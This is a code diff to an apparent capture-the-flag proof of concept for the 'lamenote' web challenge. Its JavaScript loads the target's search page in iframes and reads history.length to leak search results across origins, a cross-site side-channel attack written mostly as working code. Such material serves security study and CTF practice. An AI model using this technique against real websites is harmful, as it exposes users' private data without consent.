@@ -4,14 +4,24 @@
     <script>
     (async function(){
     async function go(body) {
-      let url = "https://lamenote-web.chal.irisc.tf/search?query=123"
+      let url = "https://lamenote-web.chal.irisc.tf/search?query=x"
       f = document.createElement('iframe')
       f.setAttribute('sandbox', 'allow-same-origin');
       f.setAttribute('csp', "img-src 'none';")
       f.src = url; // go to the site
+      f.onload = () => {
+          rCount += 1;
+          // change location after onload once
+          setTimeout(() => {
+              f.onload = null
+              f.src = url;
+          }, 100)
+      }
       document.body.appendChild(f)
       await new Promise(r => setTimeout(r, 1000)); // sleep 1000ms to wait for it to load 
-      f.src = 'https://www.0xrudra.in/';
+      f.remove();
+      f.src = 'https://www.0xrudra.in/ctf/lamenotePoc.html';
+      document.body.appendChild(f)
       await new Promise(r => setTimeout(r, 1000)); // sleep 1000ms to wait for it to load 
       let length = f.contentWindow.history.length;
       console.log(`${body} history=${length}`)
@@ -21,7 +31,7 @@
     await go('!')
     await go('a')
     await go('b')
-    await go('c')
+    await go('x')
     })();
     </script>
 </body>
